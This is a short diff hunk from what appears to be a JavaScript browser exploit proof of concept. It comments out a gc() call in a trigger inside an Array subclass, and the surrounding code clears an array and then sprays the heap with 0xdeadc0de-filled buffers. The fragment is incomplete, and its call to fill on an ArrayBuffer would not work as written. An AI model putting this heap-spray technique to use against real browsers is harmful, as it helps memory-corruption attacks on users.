@@ -66,7 +66,7 @@ class SoSpecial extends Array {
         return function() {
             if (Trigger) {
                 Arr.length = 0;
-                gc(); // تحرير الذاكرة
+               // gc(); // تحرير الذاكرة
                 let spray = new Array(0x1000).fill(new ArrayBuffer(0x100).fill(0xdeadc0de)); // heap spraying
                 alert("Heap sprayed with 0xdeadc0de");
             }
